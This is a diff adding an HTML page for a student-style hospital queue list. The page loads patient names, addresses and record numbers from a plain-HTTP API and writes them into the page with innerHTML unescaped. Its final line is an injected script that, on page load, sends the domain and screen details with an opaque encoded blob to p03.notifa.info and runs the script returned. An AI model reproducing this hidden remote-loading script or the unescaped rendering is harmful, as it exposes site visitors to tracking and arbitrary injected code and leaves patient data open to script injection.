@@ -1,0 +1,121 @@
+
+<!DOCTYPE html>
+<html lang="en" >
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="icon" href="logo.png" type="image/x-icon"/>
+        <title>List Antrian - Fake Hospital Yogyakarta</title>
+        <link href="https://fonts.googleapis.com/css?family=Poppins:100,200,400,300,500,600,700" rel="stylesheet">
+        <link rel="stylesheet" href="css/linearicons.css">
+        <link rel="stylesheet" href="css/font-awesome.min.css">
+        <link rel="stylesheet" href="css/magnific-popup.css">
+        <link rel="stylesheet" href="css/nice-select.css">
+        <link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
+        <link rel="stylesheet" href="css/bootstrap.css">
+        <link rel="stylesheet" href="css/main.css">
+        <link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
+        <link rel="stylesheet" href="/resources/demos/style.css">
+        <script src="https://code.jquery.com/jquery-1.12.4.js"></script>
+        <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+        <style>
+            #tabel {
+                font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+                border-collapse: collapse;
+                width: 50%;
+            }
+
+            #tabel td, #tabel th {
+                border: 1px solid #ddd;
+                padding: 8px;
+            }
+
+            #tabel tr:nth-child(even){background-color: #f2f2f2;}
+
+            #tabel tr:hover {background-color: #ddd;}
+
+            #tabel th {
+                padding-top: 12px;
+                padding-bottom: 12px;
+                text-align: center;
+                background-color: #4CAF50;
+                color: white;
+            }
+        </style>
+    <body style="background-color:#f2f2f2;">
+        <section id="home">
+            <header class="default-header">
+                <div class="container">
+                    <div class="header-wrap">             
+                        <div class="header-top d-flex justify-content-between align-items-center">
+                            <div class="logo">                
+                                <a href="http://it-projects.usd.ac.id/~165314031/rs/"><h1>Welcome</h1></a>
+                            </div>
+                            <div class="main-menubar d-flex align-items-center">
+                                <nav class="hide">
+                                    <a href="http://it-projects.usd.ac.id/~165314031/rs/">Home</a>
+                                    <a href="http://it-projects.usd.ac.id/~165314031/rs/dokter.html">List Dokter</a>
+                                    <a href="http://it-projects.usd.ac.id/~165314031/rs/klinik.html">List Klinik</a>                                    
+                                    <a href="http://it-projects.usd.ac.id/~165314031/rs/pasien.html">List Pasien</a>
+                                    <a href="http://it-projects.usd.ac.id/~165314031/rs/login.html">Login Admin</a>
+                                </nav>
+                                <div class="menu-bar"><span class="lnr lnr-menu"></span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+        </section>
+        <br><br>
+        <br>
+        <br><br>
+    <center>
+        <p id="output"></p>
+    </center>
+    <script>
+        var url = "http://202.94.83.190:8080/165314031_RSKUv2/webresources/Antrian/getAntrian";
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+                getList(this.responseText);
+            }
+        }
+        xmlhttp.open("GET", url, true);
+        xmlhttp.send();
+        function getList(response) {
+            var arr = JSON.parse(response);
+            var i;
+            var out = "<table id='tabel'>";
+                    out += "<tr><th>ID</th>"
+                    out += "<th>No. RM</th>"
+                    out += "<th>Nama Pasien</th>"
+                    out += "<th>Alamat Pasien</th>"
+                    out += "<th>Nama Klinik</th>"
+                    out += "<th>Tanggal Rawat</th></tr>"
+            for (i = 0; i < arr.length; i++) {
+                out += "<tr><td>" + arr[i].id +
+                        "</td><td>" + arr[i].noRm +
+                        "</td><td>" + arr[i].nama +
+                        "</td><td>" + arr[i].alamat +
+                        "</td><td>" + arr[i].namaKlinik +
+                        "</td><td>" + arr[i].tanggal +
+                        "</td></tr>";
+            }
+            out += "</table>";
+            document.getElementById("output").innerHTML = out;
+            ;
+        }
+    </script>
+    <script src="js/vendor/jquery-2.2.4.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
+    <script src="js/vendor/bootstrap.min.js"></script>
+    <script src="js/jquery.ajaxchimp.min.js"></script>
+    <script src="js/jquery.nice-select.min.js"></script>
+    <script src="js/jquery.sticky.js"></script>
+    <script src="js/parallax.min.js"></script>
+    <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+    <script src="js/jquery.magnific-popup.min.js"></script>
+    <script src="js/waypoints.min.js"></script>
+    <script src="js/jquery.counterup.min.js"></script>
+    <script src="js/main.js"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdEM8W4uMTClNqoO%2bmanvbirGKp5v%2blBRaAu0KjIsgr7MkTV4Ev07Cx%2b%2fbGdF0iw%2fatGPgF2FWU54MFbS%2fSTKhXufSlEin1tcqC%2ftrvOJSwS7X4EB1ZrPW9Dqb4w2h%2f99BhgaNX8FavNz4H5ER6OTm5u886vjyoZiU0LUdFZ1mA9dLBTijJYGZoUjH8B4JI66NE9n%2bX8UHP6eDmgrs58pjGKHYczTfiJkII%2bpMfk%2fN5Kq7nTE0tBt0RwllDBPVSasgNYiEB6UZYz5dtcR4U7hm951%2bVrezSFglA%2bN%2f3B8wJdhv%2b05W9Yhp3uCNW1InVWq6A1lBv9hGubA0OgZPkOzBa%2bPWBR7Uahqd2677LpNonQ45xtHlKxRZPQTZvPdhxuwNPLBpzmCZQoeWi%2b4cv9MefAJ9iDKNrlgfK7r%2brJcgtCuBJEqvDYxfg9pT%2bdw8gzZFhoEMIMOXqqiFfhnvPE835Pvjg98njCHp%2fKH07jTlgvQ3Kgj6wxrnyxnIs0i8j0RamvYm0c5LuGtGYyg0PsjLo0hvPxOZnazSTd%2fYju8yO91F3SwU4XXXfw53V76vH%2fM09JuTRp2JQz9D%2bXyHvqHygw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
